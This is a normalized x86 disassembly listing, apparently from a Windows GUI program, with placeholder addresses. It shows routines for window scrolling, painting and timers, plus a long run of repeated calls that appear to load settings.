mov eax [ esp + 0x68 ]
mov ecx [ esp + 0x6c ]
mov edx [ esp + 0x70 ]
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x74 ]
mov [ esp + 0x38 ] ecx
push ebp
push esi
push ebx
push ebx
push ebx
lea edx [ esp + 0x7c ]
push edx
push edi
call sub_45cef0
add esp 0x1c
jmp r-xdata
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] ecx
mov eax ebp
neg eax
push eax
mov ecx esi
neg ecx
mov [ esp + 0x44 ] edx
push ecx
lea edx [ esp + 0x3c ]
push edx
call [ OffsetRect@IAT ]
push 0x0
call [ GetStockObject@IAT ]
push eax
lea eax [ esp + 0x38 ]
push eax
push edi
call [ FillRect@IAT ]
jmp r-xdata
sub_47a620
sub esp 0x5c
push ebx
mov ebx [ esp + 0x68 ]
push ebp
push esi
push edi
mov edi [ esp + 0x70 ]
test edi edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test ebx ebx
je r-xdata
mov al [ rw-data ]
test al al
mov [ esp + 0x13 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x5c
retn
mov eax [ rw-data ]
push eax
call [ GetDC@IAT ]
mov esi eax
mov eax [ rw-data ]
test eax eax
mov eax [ rw-data ]
mov [ esp + 0x14 ] esi
mov [ esp + 0x28 ] 0xffffffff
je r-xdata
mov ecx rw-data
call sub_404310
mov [ esp + 0x13 ] 0x1
call [ timeGetTime@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
test eax eax
jne r-xdata
cmp eax 0xffffffff
je r-xdata
mov [ esp + 0x28 ] eax
test [ rw-data ] 0x40000000
je r-xdata
push 0x0
push 0xffffffff
call sub_472de0
add esp 0x8
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ rw-data ]
cmp ecx [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push 0x0
mov esi eax
push 0x0
add eax edi
push 0x0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov ebp ecx
add ecx ebx
push 0x0
push eax
mov [ rw-data ] ecx
call sub_466930
mov edi [ rw-data ]
mov edx [ rw-data ]
mov ebx [ rw-data ]
add esp 0x18
lea ecx [ esp + 0x3c ]
push ecx
sub edi ebp
push edx
sub ebx esi
mov [ esp + 0x7c ] edi
call [ GetClientRect@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
call [ CreateRectRgn@IAT ]
mov ebp [ esp + 0x14 ]
mov esi eax
lea eax [ esp + 0x4c ]
push eax
push ebp
call [ GetClipBox@IAT ]
push 0x2
push esi
push ebp
call [ ExtSelectClipRgn@IAT ]
push esi
mov ebp eax
call [ DeleteObject@IAT ]
cmp ebp 0x3
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ebp [ rw-data ]
push 0x0
or ebp 0x80000000
push esi
mov [ rw-data ] ebp
call sub_473580
add esp 0x8
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x48 ]
push eax
push 0x0
push ecx
push edx
call sub_478af0
add esp 0x1c
mov ecx [ esp + 0x4c ]
cmp ecx [ esp + 0x3c ]
je r-xdata
lea edx [ esp + 0x20 ]
push edx
call [ GetCursorPos@IAT ]
mov ecx [ rw-data ]
lea eax [ esp + 0x20 ]
push eax
push ecx
call [ ScreenToClient@IAT ]
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
mov edx [ esp + 0x30 ]
push ecx
mov ecx [ esp + 0x38 ]
push eax
push ecx
push edx
call sub_477a80
add esp 0x20
push 0x0
push eax
call sub_472de0
add esp 0x8
mov eax [ esp + 0x28 ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0x50 ]
cmp edx [ esp + 0x40 ]
je r-xdata
test ebx ebx
jl r-xdata
mov ecx rw-data
call sub_401420
pop edi
pop esi
pop ebp
pop ebx
add esp 0x5c
jmp [ GdiFlush@IAT ]
mov eax [ esp + 0x14 ]
mov ecx [ rw-data ]
push eax
push ecx
call [ ReleaseDC@IAT ]
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov eax [ esp + 0x54 ]
cmp eax [ esp + 0x44 ]
je r-xdata
test edi edi
jl r-xdata
mov ecx [ esp + 0x58 ]
cmp ecx [ esp + 0x48 ]
je r-xdata
test ebx ebx
jg r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
test eax eax
push edx
push ecx
mov [ esp + 0x78 ] esp
mov ecx esp
je r-xdata
test edi edi
jg r-xdata
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x7c ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
push 0x1
lea eax [ esp + 0x80 ]
push eax
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x30 ]
push edx
lea eax [ esp + 0x38 ]
push eax
call sub_45ddb0
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx [ rw-data ]
add esp 0x20
test ecx ecx
je r-xdata
inc [ eax + 0xd48 ]
mov esi [ esp + 0x20 ]
cmp [ esp + 0x1c ] esi
jne r-xdata
cmp eax edx
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov edi [ esp + 0x70 ]
cmp [ esp + 0x18 ] edi
je r-xdata
cmp [ rw-data ] 0x2
je r-xdata
lea ecx [ esp + 0x2c ]
push ecx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esp + 0x2c ]
mov edi [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
mov ebp [ esp + 0x38 ]
sub edi ecx
sub ebp eax
mov eax edi
sub eax esi
cdq
sub eax edx
mov ecx eax
sar ecx 0x1
test ecx ecx
mov [ esp + 0x2c ] ecx
jge r-xdata
test ecx ecx
je r-xdata
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
mov ecx [ rw-data ]
push ecx
call [ UpdateWindow@IAT ]
jmp r-xdata
test bl 0x1
je r-xdata
mov edx [ esp + 0x70 ]
mov eax ebp
sub eax edx
cdq
sub eax edx
sar eax 0x1
test eax eax
mov [ esp + 0x30 ] eax
jge r-xdata
xor ecx ecx
mov [ esp + 0x2c ] ecx
mov edx [ esp + 0x14 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edx
call sub_478af0
mov eax [ rw-data ]
add esp 0x1c
test eax eax
je r-xdata
cmp eax edx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
add ecx esi
cmp ecx edi
mov [ esp + 0x34 ] ecx
jle r-xdata
xor eax eax
mov [ esp + 0x30 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
push 0x0
call sub_43d2c0
mov eax [ rw-data ]
add esp 0x4
mov edx [ esp + 0x70 ]
add eax edx
cmp eax ebp
mov [ esp + 0x38 ] eax
jle r-xdata
mov [ esp + 0x34 ] edi
call sub_43d380
jmp r-xdata
mov eax [ rw-data ]
test eax eax
mov ecx [ rw-data ]
je r-xdata
mov [ esp + 0x38 ] ebp
mov eax [ esp + 0x74 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x3c ]
push edx
neg eax
mov esi ebx
push eax
neg esi
push esi
push ecx
mov [ esp + 0x40 ] eax
call [ ScrollWindowEx@IAT ]
cmp ecx [ rw-data ]
jne r-xdata
mov eax [ esp + 0x74 ]
test eax eax
jle r-xdata
cmp [ esp + 0x74 ] ecx
je r-xdata
mov eax [ esp + 0x74 ]
lea edx [ esp + 0x2c ]
push edx
neg eax
mov esi ebx
push eax
neg esi
push esi
push ecx
mov [ esp + 0x30 ] eax
call sub_43d4c0
push 0x0
call sub_43d2c0
add esp 0x14
jmp r-xdata
jge r-xdata
mov edx [ esp + 0x18 ]
mov ecx ebp
mov [ esp + 0x5c ] edx
mov edx [ esp + 0x1c ]
sub ecx eax
mov [ esp + 0x60 ] ecx
mov [ esp + 0x64 ] edx
mov [ esp + 0x68 ] ebp
jmp r-xdata
cmp ebx ecx
jle r-xdata
mov [ rw-data ] 0x1
mov al [ rw-data ]
xor ecx ecx
cmp ebx ecx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] edi
mov [ esp + 0x70 ] al
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x64 ] ecx
mov [ esp + 0x68 ] edx
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x68 ]
push eax
push 0x0
push ecx
push edx
call sub_478af0
add esp 0x1c
jge r-xdata
mov eax edi
sub eax ebx
mov [ esp + 0x1c ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x64 ] edi
jmp r-xdata
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
mov [ esp + 0x18 ] esi
mov [ esp + 0x5c ] ecx
mov [ esp + 0x64 ] esi
mov eax [ rw-data ]
push ecx
push ecx
push ecx
lea edx [ esp + 0x68 ]
push edx
push ecx
mov [ esp + 0x74 ] ecx
mov ecx [ esp + 0x28 ]
push eax
push ecx
mov [ esp + 0x84 ] ebp
call sub_478af0
add esp 0x1c
mov dl [ esp + 0x70 ]
mov [ rw-data ] dl
jmp r-xdata
mov eax [ esp + 0x74 ]
test eax eax
je r-xdata
call sub_43d380
mov al [ rw-data ]
test al al
je r-xdata
mov al [ esp + 0x70 ]
test al al
jne r-xdata
lea ecx [ esp + 0x20 ]
push ecx
call [ GetCursorPos@IAT ]
mov eax [ rw-data ]
lea edx [ esp + 0x20 ]
push edx
push eax
call [ ScreenToClient@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
push 0x0
push 0x0
push 0x0
push ecx
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x30 ]
push eax
mov eax [ esp + 0x38 ]
push edx
push eax
push ecx
call sub_477a80
add esp 0x20
sub_47ac20
sub esp 0x8
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
mov edi [ rw-data ]
xor eax eax
test edi edi
setge al
xor ebx ebx
test esi esi
setge bl
lea eax [ eax + eax - 0x1 ]
mov edi eax
lea ebx [ ebx + ebx - 0x1 ]
mov [ esp + 0x14 ] ebx
call [ timeGetTime@IAT ]
mov edx [ rw-data ]
mov ecx eax
sub ecx edx
mov edx [ rw-data ]
mov ebp [ rw-data ]
imul edx ecx
mov eax 0x10624dd3
mul edx
shr edx 0x7
add edx ebp
imul edx ecx
mov eax 0x10624dd3
mul edx
shr edx 0x6
mov eax edx
sub eax [ rw-data ]
cmp eax 0x78
mov [ esp + 0x10 ] eax
jle r-xdata
mov edx [ rw-data ]
mov ebp [ rw-data ]
add edx eax
test ebp ebp
mov [ rw-data ] edx
jne r-xdata
mov eax 0x78
mov [ esp + 0x10 ] eax
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
xor esi esi
imul eax ebx
jmp r-xdata
fild [ rw-data ]
fild [ rw-data ]
fpatan
fild [ esp + 0x10 ]
fld st1
fcos
fmul st1
call sub_4b64c4
fxch st1
fsin
mov esi eax
fmul st1
call sub_4b64c4
fstp st0
test esi esi
jne r-xdata
imul eax edi
mov esi eax
xor eax eax
test esi esi
jne r-xdata
test eax eax
jne r-xdata
mov esi edi
mov ecx [ rw-data ]
imul ebp edi
lea edx [ ecx + esi ]
imul edx edi
cmp edx ebp
jle r-xdata
mov esi edi
jmp r-xdata
mov eax ebx
mov ecx [ rw-data ]
mov ebp [ rw-data ]
lea edx [ ecx + eax ]
imul ebp ebx
imul edx ebx
cmp edx ebp
jle r-xdata
mov esi [ rw-data ]
sub esi ecx
mov ebx [ rw-data ]
mov ebp [ rw-data ]
push eax
push esi
call sub_47a620
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx [ rw-data ]
sub ecx ebx
add eax ecx
mov ecx [ rw-data ]
sub edx ebp
add ecx edx
mov edx [ rw-data ]
mov [ rw-data ] eax
imul eax edi
imul edx edi
add esp 0x8
cmp eax edx
pop edi
pop esi
pop ebp
mov [ rw-data ] ecx
pop ebx
jl r-xdata
mov eax [ rw-data ]
sub eax ecx
add esp 0x8
retn 0x10
mov eax [ esp + 0x4 ]
mov edx [ rw-data ]
imul ecx eax
imul edx eax
cmp ecx edx
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push eax
push ecx
call [ KillTimer@IAT ]
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x0
push eax
call sub_472de0
add esp 0x8
mov [ rw-data ] 0xffffffff
sub_47ae00
mov eax [ rw-data ]
sub esp 0x38
test eax eax
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x4c ]
je r-xdata
mov esi [ esp + 0x50 ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov eax ecx
sub eax esi
mov esi [ esp + 0x50 ]
imul eax edi
test eax eax
jl r-xdata
mov ecx [ rw-data ]
mov eax [ esp + 0x1c ]
lea ebx [ ecx + edx ]
add ebx edi
lea ebp [ eax + 0x1 ]
cmp ebx ebp
jle r-xdata
xor edi edi
jmp r-xdata
call [ timeGetTime@IAT ]
mov ecx [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] 0x0
mov eax [ rw-data ]
mov ebp [ rw-data ]
mov edx eax
sub edx ebp
imul edx esi
test edx edx
jge r-xdata
mov eax [ esp + 0x18 ]
lea edx [ ecx + edi ]
cmp edx eax
jge r-xdata
sub eax ecx
sub eax edx
inc eax
mov edi eax
jmp r-xdata
mov edx [ esp + 0x3c ]
test edx edx
jne r-xdata
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
call sub_45e3f0
mov edx [ esp + 0x28 ]
add esp 0x8
test edx edx
jne r-xdata
mov ebp [ rw-data ]
mov edx [ rw-data ]
sub ecx ebp
sub eax edx
add edi ecx
add esi eax
jmp r-xdata
neg ecx
mov edi ecx
mov ecx [ rw-data ]
mov eax [ esp + 0x38 ]
lea ebx [ ecx + edx ]
add ebx esi
lea ebp [ eax + 0x1 ]
cmp ebx ebp
jle r-xdata
xor esi esi
jmp r-xdata
mov edx [ esp + 0x34 ]
lea eax [ ecx + esi ]
cmp eax edx
jge r-xdata
sub eax ecx
sub eax edx
inc eax
mov esi eax
jmp r-xdata
xor ebx ebx
cmp edi ebx
jne r-xdata
neg ecx
mov esi ecx
cmp [ esp + 0x54 ] ebx
je r-xdata
cmp esi ebx
je r-xdata
push esi
push edi
call sub_47a620
add esp 0x8
cmp [ rw-data ] ebx
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x38
retn
call [ timeGetTime@IAT ]
mov ecx [ rw-data ]
push sub_47ac20
push 0x4
push 0xa
push ecx
mov [ rw-data ] eax
mov [ rw-data ] ebx
call [ SetTimer@IAT ]
pop edi
pop esi
pop ebp
mov [ rw-data ] eax
pop ebx
add esp 0x38
retn
sub_47af80
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x5
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_46c430
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x5
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_46a1f0
add esp 0x14
add edi 0x20
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_47aff0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_46c730
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_47b020
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_46c7b0
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_47b050
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_46c830
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_47b080
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_46c8b0
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_47b0b0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_46c930
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_47b0e0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_46c9b0
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_47b110
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_46ca30
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_47b140
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_46cab0
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_47b170
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_46cb30
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_47b1a0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_46cbb0
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_47b1d0
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_4c0fbc
push eax
mov eax 0x10518
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
push ebp
push esi
push edi
lea ecx [ esp + 0x51c ]
call sub_434e80
mov eax [ esp + 0x1053c ]
xor esi esi
push eax
lea ecx [ esp + 0x520 ]
mov [ esp + 0x10534 ] esi
call sub_434ed0
mov ebx [ esp + 0x10540 ]
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
cmp [ rw-data ] esi
je r-xdata
push ebx
push rw-data
push 0x80000000
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x80000000
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x280
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1e0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x4
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_4351e0
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x14
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435780
push ebx
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435780
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x2
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x4b
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x6
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov ecx [ rw-data ]
push ecx
call sub_46fbb0
add esp 0x4
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
test eax eax
mov ebp [ rw-data ]
jne r-xdata
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_4351e0
cmp [ rw-data ] esi
jne r-xdata
shl ebp 0x14
mov [ rw-data ] ebp
push ebx
push rw-data
push 0x96
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x64
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x3
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
fld [ rw-data ]
fmul [ r--data ]
push ebx
lea eax [ esp + 0x20 ]
push eax
push ecx
fstp [ esp ]
call sub_452500
add esp 0x4
push eax
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
test eax eax
je r-xdata
cmp [ rw-data ] ebp
jbe r-xdata
fild [ esp + 0x1c ]
fmul [ r--data ]
fstp [ rw-data ]
test bl bl
je r-xdata
mov edi [ rw-data ]
cmp edi esi
je r-xdata
mov edi [ rw-data ]
lea ebp [ edi + 0x1 ]
push ebp
lea ecx [ esp + 0x114 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
push ebx
lea edx [ esi - 0x4 ]
push edx
push 0x0
push r--data
lea eax [ esp + 0x120 ]
push eax
lea ecx [ esp + 0x530 ]
call sub_435100
mov ecx [ esp + edi * 4 + 0x54 ]
push ebx
push esi
push ecx
push r--data
lea edx [ esp + 0x120 ]
push edx
lea ecx [ esp + 0x530 ]
call sub_435100
mov ecx [ esp + edi * 4 + 0x40 ]
push ebx
lea eax [ esi - 0x8 ]
push eax
push ecx
push r--data
lea edx [ esp + 0x120 ]
push edx
lea ecx [ esp + 0x530 ]
call sub_435100
mov ecx [ esp + edi * 4 + 0xd4 ]
push ebx
lea eax [ esi - 0x1c ]
push eax
push ecx
push r--data
lea edx [ esp + 0x120 ]
push edx
lea ecx [ esp + 0x530 ]
call sub_435100
mov ecx [ esp + edi * 4 + 0xfc ]
push ebx
lea eax [ esi - 0x18 ]
push eax
push ecx
push r--data
lea edx [ esp + 0x120 ]
push edx
lea ecx [ esp + 0x530 ]
call sub_435100
mov ecx [ esp + edi * 4 + 0xc0 ]
push ebx
lea eax [ esi - 0x14 ]
push eax
push ecx
push r--data
lea edx [ esp + 0x120 ]
push edx
lea ecx [ esp + 0x530 ]
call sub_435100
mov ecx [ esp + edi * 4 + 0xe8 ]
push ebx
lea eax [ esi - 0xc ]
push eax
push ecx
push r--data
lea edx [ esp + 0x120 ]
push edx
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
lea eax [ esi - 0x10 ]
push eax
push 0x0
push r--data
lea ecx [ esp + 0x120 ]
push ecx
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
lea edx [ esi + 0x4 ]
push edx
